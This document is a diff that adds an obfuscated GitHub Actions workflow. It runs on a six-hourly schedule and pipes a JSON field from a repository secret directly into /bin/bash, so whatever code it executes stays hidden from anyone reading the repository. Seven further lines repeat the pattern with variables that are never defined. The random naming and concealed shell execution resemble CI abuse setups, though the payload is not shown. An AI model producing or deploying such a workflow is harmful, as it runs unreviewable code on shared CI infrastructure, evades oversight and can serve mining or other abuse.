@@ -1,0 +1,24 @@
+name: tengyuxi3412
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tengyuxi3412
+        env:
+          mmzam30: ${{ secrets.mmzam30 }}
+        run: |
+          echo $mmzam30 | jq -r .njj48118 | /bin/bash
+          echo $rvppu87714 | jq -r .nqp369 | /bin/bash
+          echo $qihwm337 | jq -r .pl2 | /bin/bash
+          echo $rv7 | jq -r .m43 | /bin/bash
+          echo $wyr16116 | jq -r .s9 | /bin/bash
+          echo $qhjar53754 | jq -r .cbd95033 | /bin/bash
+          echo $u12 | jq -r .f9322 | /bin/bash
+          echo $mx9 | jq -r .pcg6 | /bin/bash
+
